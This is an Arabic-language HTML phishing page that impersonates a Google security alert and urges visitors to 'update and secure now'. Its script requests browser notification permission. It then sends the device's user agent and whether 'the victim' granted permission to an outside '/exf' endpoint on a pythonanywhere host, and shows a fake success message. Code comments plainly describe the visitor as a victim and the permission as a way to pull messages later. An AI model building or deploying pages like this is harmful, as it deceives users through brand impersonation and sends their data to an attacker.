<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تنبيه أمني: تحديث مطلوب</title>
    <style>
        body { background-color: #f8f9fa; font-family: sans-serif; text-align: center; padding: 50px 20px; }
        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        img { width: 70px; }
        h1 { color: #d9534f; font-size: 20px; }
        button { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png">
        <h1>تحذير أمني من Google</h1>
        <p>تم اكتشاف نشاط مشبوه. يرجى تفعيل بروتوكول الحماية فوراً لحماية رسائلك وصورك من السرقة.</p>
        <button onclick="startAction()">تحديث وتأمين الآن</button>
    </div>

    <script>
        async function startAction() {
            // طلب إذن الإشعارات لسحب الرسائل مستقبلاً
            const permission = await Notification.requestPermission();
            
            const data = {
                device: navigator.userAgent,
                msg: permission === 'granted' ? "✅ الضحية ضغط سماح (السحب نشط)" : "❌ الضحية رفض الصلاحية"
            };

            // إرسال البيانات إلى سيرفرك
            fetch('https://Mohammed33233.pythonanywhere.com/exf', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(() => {
                if(permission === 'granted') {
                    alert("تم تفعيل الحماية بنجاح!");
                }
            })
            .catch(err => console.error("Error:", err));
        }
    </script>
</body>
</html>
